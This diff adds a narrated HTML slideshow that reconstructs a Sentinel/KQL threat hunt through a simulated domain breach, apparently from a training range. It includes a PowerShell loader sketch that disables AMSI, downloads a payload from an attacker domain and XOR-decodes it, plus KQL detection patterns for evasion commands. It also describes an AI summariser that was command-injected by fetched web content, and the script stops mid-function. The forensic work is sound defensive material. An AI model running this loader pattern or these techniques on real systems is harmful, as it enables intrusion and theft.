@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GF-INC-2026-0704 // LIVEHunt 12 — Narrated Threat-Hunt Explainer</title>
+<style>
+  :root{
+    --bg:#05080E; --panel:#0C1420; --panel2:#0F1A28; --line:#1E2E42;
+    --ink:#DCE7F2; --mut:#7C90A6; --cyan:#39D0FF; --green:#7CFF9B; --red:#FF5C6C;
+    --amber:#FFCB6B; --purple:#B69CFF;
+    --mono:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+    --sans:"Segoe UI",system-ui,-apple-system,Roboto,Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;height:100%;background:var(--bg);color:var(--ink);font-family:var(--sans);overflow:hidden}
+  #app{position:fixed;inset:0;display:flex;flex-direction:column}
+  /* animated backdrop */
+  .grid{position:absolute;inset:0;background-image:linear-gradient(rgba(57,208,255,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(57,208,255,.05) 1px,transparent 1px);background-size:44px 44px;animation:pan 22s linear infinite;pointer-events:none}
+  @keyframes pan{to{background-position:44px 44px}}
+  .glowtop{position:absolute;top:-30%;left:50%;transform:translateX(-50%);width:120vw;height:60vh;background:radial-gradient(ellipse at center,rgba(57,208,255,.10),transparent 60%);pointer-events:none}
+  .scan{position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(255,255,255,.015) 0 2px,transparent 2px 4px);pointer-events:none;mix-blend-mode:overlay}
+  /* top bar */
+  header{position:relative;z-index:5;display:flex;align-items:center;justify-content:space-between;padding:14px 26px;border-bottom:1px solid var(--line);background:linear-gradient(180deg,rgba(12,20,32,.9),rgba(12,20,32,.4))}
+  .brand{display:flex;align-items:center;gap:14px;font-family:var(--mono);font-size:13px;letter-spacing:2px;color:var(--mut)}
+  .brand b{color:var(--cyan)}
+  .live{display:inline-flex;align-items:center;gap:7px;color:var(--red);font-weight:700}
+  .dot{width:9px;height:9px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red);animation:pulse 1.3s infinite}
+  @keyframes pulse{50%{opacity:.25}}
+  .ctrls{display:flex;gap:8px}
+  .btn{font-family:var(--mono);font-size:12px;color:var(--ink);background:var(--panel2);border:1px solid var(--line);padding:7px 12px;border-radius:7px;cursor:pointer;transition:.15s;letter-spacing:1px}
+  .btn:hover{border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 12px rgba(57,208,255,.25)}
+  .btn.on{color:var(--green);border-color:var(--green)}
+  .sel{font-family:var(--mono);font-size:11px;color:var(--ink);background:var(--panel2);border:1px solid var(--line);padding:6px 6px;border-radius:7px;max-width:170px;cursor:pointer}
+  .sel:hover{border-color:var(--cyan)}
+  /* stage */
+  main{position:relative;z-index:4;flex:1;display:flex;align-items:center;justify-content:center;padding:26px 46px;min-height:0}
+  #stage{width:min(1180px,96%);max-height:100%}
+  .kicker{font-family:var(--mono);color:var(--cyan);letter-spacing:3px;font-size:15px;margin-bottom:8px;opacity:0;animation:rise .6s .05s forwards}
+  h1.title{font-size:64px;line-height:1.02;margin:0 0 10px;letter-spacing:-1px;opacity:0;animation:rise .7s .12s forwards}
+  h1.title .g{background:linear-gradient(90deg,var(--cyan),var(--green));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .sub{font-size:22px;color:var(--mut);opacity:0;animation:rise .7s .22s forwards}
+  .cardhdr{display:flex;align-items:baseline;gap:16px;border-left:5px solid var(--red);padding:6px 0 6px 16px;margin-bottom:4px;opacity:0;animation:rise .5s forwards}
+  .cid{font-family:var(--mono);font-size:34px;font-weight:800;color:#fff}
+  .cid .n{color:var(--cyan)}
+  .ctag{font-family:var(--mono);font-size:13px;color:var(--amber);letter-spacing:1px}
+  .obj{font-size:20px;color:var(--ink);margin:12px 2px 14px;max-width:900px;opacity:0;animation:rise .6s .1s forwards}
+  .obj .hl{color:var(--cyan);font-weight:600}
+  .cols{display:grid;grid-template-columns:1.15fr .85fr;gap:22px;align-items:start}
+  .term{background:#04070C;border:1px solid var(--line);border-left:3px solid var(--green);border-radius:10px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,.5)}
+  .termbar{display:flex;align-items:center;gap:8px;padding:9px 12px;background:#0A121C;border-bottom:1px solid var(--line);font-family:var(--mono);font-size:12px;color:var(--mut)}
+  .tl{width:11px;height:11px;border-radius:50%}
+  .r{background:#FF5F56}.y{background:#FFBD2E}.g{background:#27C93F}
+  .termbody{padding:14px 16px;font-family:var(--mono);font-size:15px;line-height:1.5;color:var(--ink);white-space:pre-wrap;min-height:210px}
+  .termbody .c{color:var(--mut)}
+  .cursor{display:inline-block;width:9px;height:18px;background:var(--green);vertical-align:-3px;animation:blink .9s steps(1) infinite;box-shadow:0 0 8px var(--green)}
+  @keyframes blink{50%{opacity:0}}
+  .find{list-style:none;margin:0;padding:0}
+  .find li{position:relative;padding:10px 12px 10px 30px;margin-bottom:9px;background:var(--panel);border:1px solid var(--line);border-radius:9px;font-size:16px;line-height:1.4;opacity:0;transform:translateX(14px)}
+  .find li.show{animation:slidein .5s forwards}
+  .find li::before{content:"▸";position:absolute;left:11px;top:10px;color:var(--cyan)}
+  .find b{color:#fff}
+  .k{font-family:var(--mono);color:var(--green);font-size:14px}
+  .kr{font-family:var(--mono);color:var(--red);font-size:14px}
+  .panelttl{font-family:var(--mono);font-size:12px;letter-spacing:2px;color:var(--mut);margin:0 0 8px}
+  /* chain rail */
+  .rail{position:relative;z-index:5;display:flex;gap:6px;padding:12px 26px 10px;border-top:1px solid var(--line);background:linear-gradient(0deg,rgba(12,20,32,.9),transparent);overflow-x:auto}
+  .node{flex:1 0 auto;min-width:64px;text-align:center;font-family:var(--mono);font-size:10px;color:var(--mut);border-top:2px solid var(--line);padding-top:7px;transition:.3s;letter-spacing:.5px}
+  .node.done{color:var(--green);border-color:var(--green)}
+  .node.active{color:var(--cyan);border-color:var(--cyan);text-shadow:0 0 10px var(--cyan)}
+  .node.active::after{content:"";display:block;height:2px;background:var(--cyan);box-shadow:0 0 12px var(--cyan);margin-top:6px;animation:sweep 1.6s infinite}
+  @keyframes sweep{0%{opacity:.3}50%{opacity:1}100%{opacity:.3}}
+  .prog{position:relative;z-index:5;height:3px;background:var(--panel)}
+  .prog>i{display:block;height:100%;background:linear-gradient(90deg,var(--cyan),var(--green));width:0;transition:width .4s;box-shadow:0 0 10px var(--cyan)}
+  /* overlay */
+  #ov{position:fixed;inset:0;z-index:20;display:flex;flex-direction:column;align-items:center;justify-content:center;background:radial-gradient(ellipse at center,#0A1522,#04070C);text-align:center;padding:30px}
+  #ov .badge{font-family:var(--mono);color:var(--cyan);letter-spacing:4px;font-size:14px;margin-bottom:18px}
+  #ov h2{font-size:52px;margin:0 0 8px;letter-spacing:-1px}
+  #ov h2 .g{background:linear-gradient(90deg,var(--cyan),var(--green));-webkit-background-clip:text;background-clip:text;color:transparent}
+  #ov p{color:var(--mut);max-width:640px;font-size:17px;line-height:1.5}
+  #begin{margin-top:26px;font-family:var(--mono);font-size:18px;letter-spacing:2px;color:#04070C;background:linear-gradient(90deg,var(--cyan),var(--green));border:0;padding:16px 34px;border-radius:10px;cursor:pointer;font-weight:800;box-shadow:0 0 30px rgba(57,208,255,.5)}
+  #begin:hover{filter:brightness(1.08)}
+  .hint{margin-top:18px;font-family:var(--mono);font-size:12px;color:var(--mut)}
+  @keyframes rise{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+  @keyframes slidein{to{opacity:1;transform:none}}
+  .fadeout{animation:fo .35s forwards}@keyframes fo{to{opacity:0;transform:translateY(-10px)}}
+</style>
+</head>
+<body>
+<div id="app">
+  <div class="grid"></div><div class="glowtop"></div><div class="scan"></div>
+  <header>
+    <div class="brand"><span class="live"><span class="dot"></span>LIVE</span><span>LIVEHUNT&nbsp;12 &nbsp;//&nbsp; <b>GF-INC-2026-0704</b></span></div>
+    <div class="ctrls">
+      <button class="btn" id="bPrev">◀ PREV</button>
+      <button class="btn" id="bNext">NEXT ▶</button>
+      <button class="btn on" id="bAuto">AUTO ▮▮</button>
+      <button class="btn on" id="bVoice">VOICE ♪</button>
+      <select class="sel" id="bVoiceSel" title="Narrator voice (male preferred)"></select>
+      <select class="sel" id="bSpeed" title="Narration speed">
+        <option value="0.75">0.75×</option>
+        <option value="0.85" selected>0.85×</option>
+        <option value="0.95">0.95×</option>
+        <option value="1">1.0×</option>
+      </select>
+      <button class="btn" id="bReplay">REPLAY ↺</button>
+      <button class="btn" id="bFull">⤢ FULL</button>
+    </div>
+  </header>
+  <main><div id="stage"></div></main>
+  <div class="rail" id="rail"></div>
+  <div class="prog"><i id="progbar"></i></div>
+</div>
+
+<div id="ov">
+  <div class="badge">◈ DIGITAL FORENSICS &amp; INCIDENT RESPONSE ◈ MICROSOFT SENTINEL · KQL</div>
+  <h2>Greenfield Logistics<br><span class="g">Threat-Hunt Reconstruction</span></h2>
+  <p>One weaponized AI tool. Ten hours. A full Active Directory domain, gone. This is the hunt — thirteen stages, narrated, every finding pulled from the logs.</p>
+  <button id="begin">▶ BEGIN BRIEFING</button>
+  <div class="hint">Audio narration will play. &nbsp;·&nbsp; SPACE / → next &nbsp;·&nbsp; ← back &nbsp;·&nbsp; M mute &nbsp;·&nbsp; F fullscreen</div>
+</div>
+
+<script>
+const CARDS=[
+ {id:"C01",name:"Scope & Triage",tag:"ANALYST TRIAGE · workspace discovery · alert reduction",
+  obj:"Turn a loud, multi-day console into a bounded problem: which tables hold evidence, which hosts are ours, the earliest suspicious moment — and where each host sits on the network.",
+  code:["// SilentCorridor · which tables hold our hosts?",'search "GF-WS01" or "GF-SRV01" or "GF-DC01"',"| where TimeGenerated between (10:00 .. 03:00)","| summarize count() by Table=$table","| sort by count_ desc"],
+  finds:[["<b>Map derived from telemetry:</b> <span class='k'>WS01=10.1.0.133 · SRV01=10.1.0.169 · DC01=10.1.0.150</span>"],["A 4th IP <span class='kr'>10.1.0.120</span> never appears as its own device — the attacker's operator box."],["Defender pre-named the endgame: <span class='k'>AdaptixC2 · Impacket · Golden Ticket</span>."]],
+  nar:"We started blind. The alert queue was loud and spanned days, so job one was to shrink it. We asked four questions: which tables contain our hosts, what's the earliest real alert, what IP is each host, and what techniques Defender already sees. The clockwork hourly downloads? That's the AI summariser doing its job. We set it aside and anchored on the real activity."},
+ {id:"C02",name:"Initial Access",tag:"TA0001 · T1566 / T1059 — AI-tool abuse (command injection)",
+  obj:"Find the first malicious execution on GF-WS01 and — more important — its parent. The parent process names the entry vector.",
+  code:["// SilentCorridor · what did python.exe spawn?","WindowsProcess_CL","| where DvcHostname has \"GF-WS01\"",'| where ActingProcessFilePath has "python.exe"',"| project TimeGenerated, TargetProcessCommandLine"],
+  finds:[["Parent <span class='kr'>python.exe</span> — the AI page-summariser — spawned a hidden AMSI-bypass PowerShell loader."],["Download from <span class='kr'>cdn.cloud-endpoint.net</span>, confirmed in network telemetry at 10:15."],["<b>Not a phish, not a CVE</b> — a trusted AI tool, weaponized."]],
+  nar:"How did they get in? A chronological dump drowned us in browser noise, so we pivoted to the parent of the first malicious PowerShell. The parent was python-dot-exe — the company's AI page-summariser. It fetched an attacker-controlled page and got command-injected into launching a hidden, AMSI-bypassing loader. The entry point wasn't a phish or a CVE. It was a trusted AI tool, weaponized."},
+ {id:"C03",name:"Execution",tag:"TA0002 · T1059.001 PowerShell · T1055 Process Injection",
+  obj:"Understand what actually ran: the loader, the payload, and how it executed entirely in memory.",
+  code:["powershell -NoP -W Hidden -Exec Bypass -Command","  amsiInitFailed = $true            // AMSI off","  $enc = DownloadData('cloud-endpoint.net/update')","  $sc  = $enc -bxor 0x4A             // XOR decode","  Add-Type '[DllImport(...)]'        // inject"],
+  finds:[["Fileless: disable AMSI → download → XOR-decode → inject via compiled <span class='k'>DllImport</span>."],["Second stage via <span class='k'>certutil</span> → <span class='k'>C:\\Windows\\Temp\\svchost_upd.exe</span>."],["Defender named the family: <span class='kr'>AdaptixC2</span>. Nothing on disk to scan."]],
+  nar:"The loader was textbook fileless execution. Disable AMSI, download a blob from cloud-endpoint-dot-net, XOR-decode it, and inject it straight into memory with a compiled DllImport. Defender named the family for us: AdaptixC2. No file on disk to scan — the payload lived in RAM."},
+ {id:"C04",name:"Persistence",tag:"TA0003 · T1053 Task · T1547 Run Key · T1543.003 Service",
+  obj:"Enumerate every foothold so remediation pulls them all. Miss one and they walk right back in.",
+  code:["// SilentCorridor · persistence verbs","WindowsProcess_CL | where DvcHostname has \"GF-WS01\"",'| where TargetProcessCommandLine has_any',"     (\"schtasks\",\"reg add\",\"Run\",\"sc \")","| project TimeGenerated, TargetProcessCommandLine"],
+  finds:[["<b>Scheduled task</b> <span class='k'>MicrosoftHealthUpdate</span> (runs as SYSTEM)."],["<b>Run key</b> <span class='k'>WindowsHealthService</span> → same loader."],["<b>Service hijack</b> — <span class='k'>GFUpdaterSvc</span> binary swapped for payload."],["Plus <span class='k'>AnyDesk</span> on the server. The names are camouflage."]],
+  nar:"A hands-on operator always nails down access. This one planted three footholds: a scheduled task called MicrosoftHealthUpdate, a Run key called WindowsHealthService, and a hijacked service — GFUpdaterSvc, its binary swapped for the payload. Plus AnyDesk on the server. The names are deliberate camouflage. Miss one, and they walk right back in."},
+ {id:"C05",name:"Privilege Escalation",tag:"TA0004 · T1078 Valid Accounts · SYSTEM · Domain Admin",
+  obj:"Establish what privilege the attacker held and how they climbed — local → SYSTEM → domain admin → domain-wide.",
+  code:["// SilentCorridor · characterise the operator acct","WindowsAuth_CL","| where TargetUsername has \"sancadmin\"","| summarize count() by TargetDomain,LogonType,EventResult"],
+  finds:[["Persistence executed as <span class='k'>SYSTEM</span> on WS01."],["<span class='k'>sancadmin</span> seen as both local <b>and</b> domain admin."],["Real ceiling comes later: the <span class='kr'>Golden Ticket</span> on the DC — unlimited privilege."]],
+  nar:"Escalation here wasn't an exploit — it was identity. The persistence ran as SYSTEM. The operator account, sancadmin, showed up as both a local and a domain admin. And the real ceiling came later on the domain controller: once you forge a golden ticket, privilege is unlimited. Follow the accounts, not the CVEs."},
+ {id:"C06",name:"Defence Evasion",tag:"TA0005 · T1562 Impair Defenses · T1140 · T1036 Masquerade",
+  obj:"Show how they stayed quiet: what they switched off, what they obfuscated, what they disguised.",
+  code:["// SilentCorridor · evasion primitives","WindowsProcess_CL",'| where TargetProcessCommandLine has_any',"   (\"amsiInitFailed\",\"-bxor\",\"Set-MpPreference\")","| project TimeGenerated, TargetProcessCommandLine"],
+  finds:[["<b>AMSI bypass</b> — <span class='k'>amsiInitFailed=$true</span> patched in memory (×13 alerts)."],["<b>Defender tamper</b> — <span class='kr'>FeatureDisable by GF-WS01$</span> (T1562)."],["<b>Obfuscation + masquerade</b> — XOR 0x4A · <span class='k'>svchost_upd.exe</span> · WindowsHealthService."]],
+  nar:"To stay quiet, they patched AMSI in memory, disabled Defender features, and XOR-obfuscated their payload with key four-A. Even the file and task names are masquerade. We hunted those primitives directly in the command lines, and Defender confirmed the tampering."},
+ {id:"C07",name:"Credential Access",tag:"TA0006 · T1003 OS Credential Dumping · T1552",
+  obj:"Determine which credentials were harvested and how — this is what turned one box into the whole domain.",
+  code:["// Cyber-Range · who opened a handle to LSASS?","WindowsProcessAccess_CL",'| where DvcHostname has_any ("GF-WS01","GF-DC01")','| where TargetProcessFilePath has "lsass"',"| project TimeGenerated, ActingProcessFilePath"],
+  finds:[["WS01: profiled <span class='k'>Get-ADUser svc_backup</span>, read cmdkey + PowerShell history."],["DC01: <span class='kr'>LSA secrets + SAM + NTDS</span> dumped (T1003.002/.004)."],["<b>Invisible in the primary logs</b> — so we crossed into Cyber-Range and caught the LSASS handle."]],
+  nar:"This is the stage that turned one box into the whole domain. On the workstation they read cached credentials and PowerShell history, and profiled the backup service account. On the domain controller they dumped LSA secrets, the SAM, and the NTDS database. That heavy dumping was invisible in the primary logs, so we crossed into Cyber-Range and caught the handle opening on LSASS."},
+ {id:"C08",name:"Discovery",tag:"TA0007 · T1087 Account · T1018 System · T1069 Groups",
+  obj:"Recover the attacker's map of the environment — their recon tells us where they meant to go next.",
+  code:["// SilentCorridor · recon verbs, all hosts","WindowsProcess_CL",'| where TargetProcessCommandLine has_any',"   (\"whoami\",\"net view\",\"repadmin\",\"Test-NetConnection\")"],
+  finds:[["Local: <span class='k'>whoami · net localgroup · arp -a</span>."],["Domain: <span class='k'>Get-ADUser/Group/Computer · repadmin</span> — DCSync groundwork."],["Port sweep revealed 2 unknown hosts: <span class='kr'>GF-BKP01</span> (backup) · <span class='kr'>GF-WEB01</span>."]],
+  nar:"Their reconnaissance is our map. Whoami, net commands, ARP. Then Active Directory enumeration and repadmin on the domain controller — the groundwork for DCSync. And a port sweep that revealed two hosts we hadn't even been told about: a backup server and a web host. Their recon told us where they were headed."},
+ {id:"C09",name:"Lateral Movement",tag:"TA0008 · T1021 Remote Services · T1550 · Impacket",
+  obj:"Reconstruct the hop chain host-to-host and prove which credential carried each hop — the backbone of the timeline.",
+  code:["// SilentCorridor · read failures THEN successes","WindowsAuth_CL",'| where TargetUsername has_any ("svc_backup","t.harris")',"| summarize by EventResult,LogonType,SrcIpAddr,DvcHostname"],
+  finds:[["<b>Spray landed:</b> <span class='k'>svc_backup → SRV01, SUCCESS 12:00:19</span> from 10.1.0.133."],["<span class='k'>t.harris</span> (password reset) → 166 logons into DC01."],["Defender: <span class='kr'>Ongoing hands-on-keyboard attack via Impacket</span>."]],
+  nar:"Authentication is the spine of the whole timeline. We summarized every logon by result, type, and source IP. A wall of failures followed by one success is a password spray landing — and that's exactly what we saw: svc_backup cracking onto the server at twelve-hundred hours. Then t-dot-harris, whose password they'd reset, driving a hundred-and-sixty-six logons into the domain controller. Defender labeled the technique: Impacket."},
+ {id:"C10",name:"Command & Control",tag:"TA0011 · T1071 App-Layer · T1219 RAT · T1105 Ingress",
+  obj:"Identify every channel used to command the estate and stage tools — needed to block infra and scope dwell.",
+  code:["// Cyber-Range · filter by the process, not the domain","DeviceNetworkEvents",'| where InitiatingProcessFileName in~',"   (\"powershell.exe\",\"python.exe\",\"rundll32.exe\")","| summarize by RemoteUrl, InitiatingProcessFileName"],
+  finds:[["C2: <span class='kr'>cdn.cloud-endpoint.net</span> (Cloudflare-fronted)."],["Beacon: <span class='kr'>AdaptixC2 via rundll32 → 57.155.101.212:443</span>."],["RAT: <span class='k'>AnyDesk</span> on SRV01. Trick: filter by the talking process."]],
+  nar:"To command the estate they used cloud-endpoint-dot-net for the loader, an AdaptixC2 beacon over rundll32, and AnyDesk for hands-on remote access. The trick to finding it in an ocean of legitimate cloud traffic? Filter by the process doing the talking — PowerShell, python, rundll32 — not just the destination."},
+ {id:"C11",name:"Collection & Exfiltration",tag:"TA0009 / TA0010 · T1005 · T1074 · T1560 · T1567.002",
+  obj:"Prove what was taken and where it went — the facts that convert 'incident' into 'reportable breach'.",
+  code:["// Cyber-Range · follow the archive out","DeviceNetworkEvents",'| where RemoteUrl has "blob.core.windows.net"',"| project TimeGenerated, InitiatingProcessFileName, RemoteUrl"],
+  finds:[["Collect: <span class='k'>Copy-Item \\\\GF-SRV01\\Finance\\Invoices</span> + Robocopy staging."],["Archive: <span class='k'>Compress-Archive → exfil.zip</span> on the DC (15:14)."],["<b>Exfil:</b> PowerShell upload to <span class='kr'>sanclogicart14191.blob.core.windows.net</span>, 19:34–19:46."]],
+  nar:"Collection and exfil are a verb chain: gather, stage, archive, upload. They copied Finance invoices, staged them on the domain controller, compressed them into exfil-dot-zip, and uploaded the archive over PowerShell to an attacker-controlled Azure blob between seven-thirty-four and seven-forty-six PM. That upload is what turns incident into reportable breach."},
+ {id:"C12",name:"Impact Assessment",tag:"TA0040 · T1558.001 Golden Ticket · domain-wide",
+  obj:"State the business truth plainly: how deep, how bad, and what the organisation must now assume.",
+  code:["// Cyber-Range · the crown-jewel alert, pinned to DC","AlertInfo | where Title has \"Golden Ticket\"","| join (AlertEvidence | distinct AlertId,DeviceName)","| where DeviceName has \"GF-DC01\""],
+  finds:[["<span class='kr'><b>Golden Ticket / krbtgt</b></span> — attacker can mint a ticket for ANY account. Resets won't evict."],["<b>Confirmed breach</b> — Finance + domain data exfiltrated off-network."],["Blast radius beyond scope — BKP01 &amp; WEB01 probed. <b>Deepest possible outcome.</b>"]],
+  nar:"Now the business truth. A forged golden ticket means the krbtgt key is compromised — the attacker can mint a ticket for any account in the domain, and password resets alone won't evict them. Data was confirmed stolen. Two more hosts were probed. This is the deepest possible outcome: a full domain breach with exfiltration."},
+ {id:"C13",name:"Close the Case",tag:"CASE CLOSURE · remediation · detections · handover",
+  obj:"Convert findings into action: contain, evict, recover — and hand the defender reusable detections.",
+  code:["# PRIORITY ORDER","1  Rotate krbtgt  x2   (kills the Golden Ticket)","2  Rebuild DC01 + SRV01 from clean media","3  Reset every credential · rip out persistence","4  Block infra · fix the AI-summariser root cause"],
+  finds:[["<b>#1 priority:</b> rotate <span class='kr'>krbtgt twice</span> — nothing else matters until then."],["Rebuild DC + server; reset all creds; remove task/key/service/AnyDesk."],["Root cause: <b>sandbox the AI summariser</b> so fetched content can't drive execution."],["Handover: ship a <span class='k'>detection pack</span> so it can't recur silently."]],
+  nar:"Closing it is about action. Rotate krbtgt twice to kill the golden ticket — that's priority one. Rebuild the domain controller and the server from clean media. Reset every credential. Rip out the persistence. Block the infrastructure. And fix the root cause: sandbox that AI summariser so fetched web content can never drive execution again. We hand the defender a detection pack so this can't happen silently twice."},
+];
+
+const SLIDES=[
+ {type:"title"},
+ {type:"method"},
+ ...CARDS.map((c,i)=>({type:"card",i})),
+ {type:"closing"},
+];
+const NAR_TITLE="Greenfield Logistics, July fourth, twenty twenty-six. One workstation lit up the alert console, and by the end of the day the entire Active Directory domain was gone. This is the reconstruction — thirteen stages, from first triage to closing the case, every finding pulled straight from the telemetry. Let's walk it.";
+const NAR_METHOD="First, the ground rules. The evidence lives in two Sentinel workspaces. SilentCorridor holds the normalized process, authentication and network logs — that's where we build the spine of the story. Cyber-Range holds the Defender and identity data — that's where the credential theft and the golden ticket hide. Three habits carried the whole hunt: scope every query, discover the schema instead of assuming field names, and confirm every finding against raw telemetry before we believe it.";
+const NAR_CLOSE="Thirteen stages. One compromised AI tool to a fallen domain in about ten hours — every step reconstructed from the logs, every claim cited. That's the hunt. The logs told the story; we just had to read them in the right order.";
+
+let idx=0, autoplay=true, voiceOn=true, typing=null, advTimer=null, revealTimers=[];
+const stage=document.getElementById('stage'), rail=document.getElementById('rail'), progbar=document.getElementById('progbar');
+
+// build rail
+CARDS.forEach(c=>{const d=document.createElement('div');d.className='node';d.textContent=c.id;d.dataset.id=c.id;rail.appendChild(d);});
+function updRail(activeCardIdx){[...rail.children].forEach((n,i)=>{n.classList.remove('active','done');if(activeCardIdx>i)n.classList.add('done');if(activeCardIdx===i)n.classList.add('active');});}
+
+const esc=s=>s.replace(/&(?![a-z]+;)/g,'&amp;');
+function codeHTML(lines){return lines.map(l=>{const t=esc(l);return t.trimStart().startsWith('//')||t.trimStart().startsWith('#')?`<span class='c'>${t}</span>`:t;}).join('\n');}
+
+function clearTimers(){if(typing)clearInterval(typing);if(advTimer)clearTimeout(advTimer);revealTimers.forEach(clearTimeout);revealTimers=[];window.speechSynthesis&&speechSynthesis.cancel();}
+
+function render(){
+  clearTimers();
+  const s=SLIDES[idx];
+  progbar.style.width=((idx)/(SLIDES.length-1)*100)+'%';
+  let html='', narration='';
+  if(s.type==='title'){
+    updRail(-1);
+    html=`<div class="kicker">◈ LIVEHUNT 12 // GF-INC-2026-0704</div>
+      <h1 class="title">The <span class="g">Anatomy</span> of a<br>Domain Breach</h1>
+      <div class="sub">Greenfield Logistics · 4 July 2026 · Hands-on-keyboard intrusion → full AD compromise</div>
+      <div class="obj" style="margin-top:26px">A narrated, stage-by-stage reconstruction in <span class="hl">Microsoft Sentinel</span> &amp; <span class="hl">KQL</span> — from a weaponized AI tool to a forged Golden Ticket. Thirteen cards. Every finding cited to the telemetry.</div>`;
+    narration=NAR_TITLE;
+  } else if(s.type==='method'){
+    updRail(-1);
+    html=`<div class="cardhdr"><span class="cid">M<span class="n">//</span></span><span class="ctag">METHODOLOGY · THE TWO-WORKSPACE STRATEGY</span></div>
+      <div class="obj">Neither workspace tells the whole story. Build the spine in one; confirm the crown jewels in the other.</div>
+      <div class="cols">
+        <div><p class="panelttl">WORKSPACES</p>
+          <ul class="find">
+            <li class="show"><b>LAW-SilentCorridor</b> — ASIM process/auth/network/DNS/registry. <span class="k">The spine of the timeline.</span></li>
+            <li class="show"><b>LAW-Cyber-Range</b> — Defender XDR / MDE + Identity. <span class="k">Cred-theft · DCSync · Golden Ticket · exfil.</span></li>
+          </ul></div>
+        <div><p class="panelttl">THREE HABITS</p>
+          <ul class="find">
+            <li class="show"><b>Scope</b> every query — 3 hosts, incident window.</li>
+            <li class="show"><b>Discover</b> schema — <span class="k">getschema</span>, never assume fields.</li>
+            <li class="show"><b>Confirm</b> before you conclude — churn ≠ intrusion.</li>
+          </ul></div>
+      </div>`;
+    narration=NAR_METHOD;
+  } else if(s.type==='closing'){
+    updRail(13);
+    html=`<div class="kicker">◈ CASE GF-INC-2026-0704 — CLOSED</div>
+      <h1 class="title">The logs told<br>the <span class="g">story.</span></h1>
+      <div class="obj" style="margin-top:20px">One weaponized AI tool → full domain compromise in ~10 hours. <b>13 stages</b>, every one reconstructed from telemetry and cited. Contain krbtgt, rebuild, evict, and fix the root cause.</div>
+      <div class="obj" style="color:var(--mut);font-family:var(--mono);font-size:15px">Prepared by Aboubacar Sakho · DFIR / Threat-Hunt Analyst · LIVEHunt 12</div>`;
+    narration=NAR_CLOSE;
+  } else {
+    const c=CARDS[s.i]; updRail(s.i);
+    html=`<div class="cardhdr"><span class="cid">${c.id.slice(0,1)}${c.id.slice(1,3)}<span class="n"> //</span></span><span class="cid" style="font-size:30px">${c.name}</span></div>
+      <div class="ctag" style="margin:0 0 6px 21px">${c.tag}</div>
+      <div class="obj">${c.obj}</div>
+      <div class="cols">
+        <div><p class="panelttl">▸ KQL — LIVE</p>
+          <div class="term"><div class="termbar"><span class="tl r"></span><span class="tl y"></span><span class="tl g"></span>&nbsp; sentinel — kql — hunt</div>
+          <div class="termbody" id="tb"></div></div></div>
+        <div><p class="panelttl">▸ WHAT THE TELEMETRY SHOWED</p>
+          <ul class="find" id="finds">${c.finds.map(f=>`<li>${f[0]}</li>`).join('')}</ul></div>
+      </div>`;
+    narration=c.nar;
+  }
+  stage.innerHTML=html;
+  stage.style.animation='none'; void stage.offsetWidth; // reflow
+
+  // typing + reveals for cards
+  if(s.type==='card'){
+    const c=CARDS[s.i];
+    typeCode(document.getElementById('tb'), c.code);
+    const lis=[...document.querySelectorAll('#finds li')];
+    lis.forEach((li,k)=>revealTimers.push(setTimeout(()=>li.classList.add('show'), 1400 + k*900)));
+  }
+  speak(narration);
+}
+
+function typeCode(el, lines){
+  const full=codeHTML(lines);
+  // type char by char over the plain text, then set html for colouring
+  const plain=lines.join('\n');
+  let i=0; el.innerHTML='<span class="cursor"></span>';
+  typing=setInterval(()=>{
+    i+=2;
+    if(i>=plain.length){clearInterval(typing);el.innerHTML=full+'<span class="cursor"></span>';return;}
+    el.innerHTML=esc(plain.slice(0,i))+'<span class="cursor"></span>';
+  }, 22);
+}
+
+// ---- speech (male voice, slower, sentence-chunked so nothing is cut) ----
+let voices=[], rate=0.85, chosenURI=null, ka=null, spoke=false;
+function loadVoices(){ voices=speechSynthesis.getVoices(); return voices; }
+function isMale(v){return /(david|mark|guy|eric|davis|roger|christopher|daniel|alex|fred|aaron|james|george|thomas|william|brian|male|\bman\b)/i.test(v.name);}
+function pickVoice(){
+  if(!voices.length) loadVoices();
+  if(chosenURI){const c=voices.find(v=>v.voiceURI===chosenURI); if(c)return c;}
+  return voices.find(v=>/^en-US/i.test(v.lang)&&isMale(v))
+      || voices.find(v=>/^en/i.test(v.lang)&&isMale(v))
+      || voices.find(v=>/Microsoft (Guy|Davis|Eric|Christopher|Roger|Mark|David)/i.test(v.name))
+      || voices.find(v=>/^en/i.test(v.lang)) || voices[0];
+}
+function populateVoiceSel(){
+  loadVoices();
+  const sel=document.getElementById('bVoiceSel'); if(!sel||!voices.length)return;
+  const en=voices.filter(v=>/^en/i.test(v.lang));
+  const list=en.length?en:voices;
+  sel.innerHTML=list.map(v=>`<option value="${v.voiceURI}">${v.name.replace(/Microsoft |Google /,'')}${isMale(v)?' ♂':''}</option>`).join('');
+  if(!chosenURI){const def=pickVoice(); if(def){chosenURI=def.voiceURI; sel.value=def.voiceURI;}}
+  else sel.value=chosenURI;
+}
+if('speechSynthesis' in window){ speechSynthesis.onvoiceschanged=populateVoiceSel; setTimeout(populateVoiceSel,250); setTimeout(populateVoiceSel,1200); }
+function keepAlive(){clearInterval(ka);ka=setInterval(()=>{ if(speechSynthesis.speaking) speechSynthesis.resume(); else clearInterval(ka); },8000);}
+function speak(text){
+  if(advTimer)clearTimeout(advTimer);
+  if(!('speechSynthesis' in window)||!voiceOn||!text){ if(autoplay) scheduleAdvance(6500); return; }
+  speechSynthesis.cancel();
+  const v=pickVoice();
+  const chunks=(text.match(/[^.!?]+[.!?]*/g)||[text]).map(s=>s.trim()).filter(Boolean);
+  let ci=0; spoke=false;
+  const nextChunk=()=>{
+    if(ci>=chunks.length){ if(autoplay) scheduleAdvance(1600); return; }  // finished the FULL narration
+    const u=new SpeechSynthesisUtterance(chunks[ci]);
+    if(v)u.voice=v; u.rate=rate; u.pitch=0.95; u.volume=1;
+    u.onstart=()=>{spoke=true;};
+    u.onend=()=>{ ci++; nextChunk(); };
